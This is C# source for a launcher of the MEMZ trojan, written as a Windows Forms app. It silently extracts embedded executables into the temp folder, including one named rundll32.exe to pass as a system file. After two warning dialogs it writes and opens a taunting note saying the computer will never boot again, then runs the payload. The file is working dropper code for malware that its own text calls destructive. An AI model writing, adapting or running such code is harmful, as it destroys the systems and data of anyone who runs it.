using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace FakeMEMZ_Run
{
    public partial class run_FakeMEMZ : Form
    {
        public run_FakeMEMZ()
        {
            InitializeComponent();
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void run_FakeMEMZ_Load(object sender, EventArgs e)
        {
            this.Hide();
            string temp = Path.GetTempPath();
            Extract("MEMZ", temp, "Resources", "decode.exe");
            Extract("MEMZ", temp, "Resources", "rundll32.exe");
            Extract("MEMZ", temp, "Resources", "MEMZ.exe");

            DialogResult WARNING = MessageBox.Show("The software you just executed is considered malware." + Environment.NewLine +
                            "This malware will harm your computer and makes it unusable." + Environment.NewLine +
                            "It you are seeing this message without knowing what you just executed. simply press No and nothing will happen." + Environment.NewLine +
                            "If you know waht this malware does and are using a safe environment to test, press Yes to start it." + Environment.NewLine + Environment.NewLine +
                            "DO YOU WANT EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (WARNING == DialogResult.Yes)
            {
                DialogResult LastWARNING = MessageBox.Show("THIS IS THE LAST WARNING!" + Environment.NewLine + Environment.NewLine +
                 "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!" + Environment.NewLine +
                 "STILL EXECUTE IT?", "MEMZ", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (LastWARNING == DialogResult.Yes)
                {
                    StreamWriter sw = File.CreateText(temp + "note.txt");
                    sw.WriteLine("YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.");
                    sw.WriteLine();
                    sw.WriteLine("Your computer won't boot up again,");
                    sw.WriteLine("so use it as long as you can!");
                    sw.WriteLine();
                    sw.WriteLine(":D");
                    sw.WriteLine();
                    sw.WriteLine("Trying to kill MEMZ will cause your system to be");
                    sw.WriteLine("destroyed instantly, so don't try it :D");
                    sw.Close();
                    System.Diagnostics.Process.Start("notepad.exe", temp + "note.txt");
                    Process.Start(temp+"rundll32.exe");
                    {
                        Application.Exit();
                    }
                }

                else if (LastWARNING == DialogResult.No)
                {
                    Application.Exit();
                }
            }
            else if (WARNING == DialogResult.No)
            {
                Application.Exit();
            }        
        }
    }
}
